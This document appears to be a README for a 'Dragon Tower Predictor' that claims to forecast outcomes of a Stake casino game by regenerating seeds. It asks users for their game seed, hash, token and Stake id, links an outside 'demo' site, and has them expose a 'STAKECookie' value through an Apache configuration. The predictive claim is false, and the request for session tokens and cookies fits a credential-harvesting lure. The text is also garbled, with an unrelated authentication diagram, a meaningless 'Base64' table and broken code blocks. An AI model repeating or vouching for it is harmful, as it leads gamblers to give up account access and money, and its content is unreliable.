<!-- EN -->
## Dragon Tower Predictor - latest algo by @elBrinquedo

<div align="center">
<a href="#"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="#"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="#"><img src="https://img.shields.io/badge/Ethereum-1ee1f5?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="#"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="#"><img src="https://img.shields.io/badge/Laravel-f5441e?style=for-the-badge&logo=laravel&logoColor=white"/></a>
<a href="#"><img src="https://img.shields.io/badge/JavaScript-f5ee1e?style=for-the-badge&logo=javascript&logoColor=white"/></a>
 
</div>

<p align="center">
  <i align="center"> The algorithm leverages a combination of seed pattern regeneration with personal AND win/loss data from other players. It's essentially a sophisticated statistical model that can splurt the most likely outcome.</i>
</p>



<a href="https://wondrous-paletas-19f407.netlify.app/"><img src="https://cdn3d.iconscout.com/3d/premium/thumb/view-demo-12210198-9984681.png"></a>



```mermaid
erDiagram
    CLIENT }|..|{ Client-Id : has
    CLIENT ||--o{ AUTH : places
    CLIENT ||--o{ POST : "liable for"
    Client-Id ||--o{ AUTH : receives
    POST ||--|{ AUTH : covers
    AUTH ||--|{ Authenticated : includes
    POST_REQUEST ||--o{ AUTH : sends
    AUTH ||--o{ ACCESS : grants
    ACCESS ||--o{ SYSTEM : accesses
    SYSTEM ||--o{ PROCESS : processes
    PROCESS ||--o{ FINISH : finishes
```
### What You Need
----
                    
| Needed      | Base64 |
| --------- | -----:|
| Last Game Seed  | 0000 |
| Hash     |   Daf |
| Last Game Id      |    000 |
| Token |    ST8 |
| Stake Id |    91 |
                

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- GETTING STARTED -->
## Getting Started

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
* npm
  ```sh
  npm install npm@latest -g
  ```
  * nginx
  ```sh
  apt-get install nginx
  ```




### Installation

**1. Unzip the Files:**

-   Download the .zip file containing the game files.
-   Extract the contents of the .zip file to your desired location, such as your `www` or `public_html` folder.

**2. Upload the Files to Your Web Server:**

-   Using an FTP client or your web hosting control panel, upload the extracted files to your `www` or `public_html` folder. Ensure that the files are uploaded correctly and without any errors.

OR : 
   ```sh
   clone the repo
   ```
**3. Grant Access to the Stake Cookie:**

-   **Apache:**
    
    -   Open your Apache configuration file (e.g., `httpd.conf`) and add the following lines within the `<Directory>` section for your game directory:
    
    ```
    <Directory "/path/to/your/game/directory">
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
        SetEnvIf Cookie STAKECookie "STAKECookie=(.*)" STAKECookie=$1
    </Directory>
    
**4. Start Playing:**

-   Open your web browser and navigate to the URL of your game directory on your web server.
- (if you are using localhost, just navigate to the root)
-   Log in to your account and enjoy the predictions!


<!-- CONTRIBUTING -->
## Contributing
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>


<p align="right">(<a href="#readme-top">back to top</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

